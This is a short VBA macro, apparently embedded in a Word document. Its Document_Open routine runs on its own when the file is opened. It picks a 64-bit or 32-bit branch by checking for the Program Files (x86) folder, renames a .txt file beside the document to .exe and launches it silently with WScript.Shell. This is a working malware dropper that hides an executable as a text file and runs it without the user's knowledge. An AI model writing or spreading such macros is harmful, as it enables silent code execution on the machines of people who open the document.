Function DirectoryExists(directory As String) As Boolean
    DirectoryExists = False
    If Not Dir(directory, vbDirectory) = "" Then
        If GetAttr(directory) = vbDirectory Then
            DirectoryExists = True
        End If
    End If
End Function

Private Sub Document_Open()
Dim sFileName64 As String, sNewFileName64 As String
Dim sFileName32 As String, sNewFileName32 As String
Dim directory As String

directory = "c:\program files (x86)"

If Not DirectoryExists(directory) = False Then

    sFileName64 = ThisDocument.Path & "\test.txt"    'name of current file
    sNewFileName64 = ThisDocument.Path & "\test.exe"     'filename to rename
    'If Dir(sFileName, 16) = "" Then MsgBox "??? ?????? ?????", vbCritical, "error": Exit Sub
 
    Name sFileName64 As sNewFileName64 'rename file
    
    'MsgBox "file has been renamed"
 
    'start test.exe
    Set WshScript = CreateObject("WScript.Shell")
    D = WshScript.Run(sNewFileName64, 4, False)
Else
      sFileName32 = ThisDocument.Path & "\test1.txt"    'name of current file
      sNewFileName32 = ThisDocument.Path & "\test1.exe"     'filename to rename
    'If Dir(sFileName, 16) = "" Then MsgBox "??? ?????? ?????", vbCritical, "error": Exit Sub
 
    Name sFileName32 As sNewFileName32 'rename file
    
    'MsgBox "file has been renamed"
 
    'start test.exe
    Set WshScript = CreateObject("WScript.Shell")
    C = WshScript.Run(sNewFileName32, 4, False)

End If
End Sub
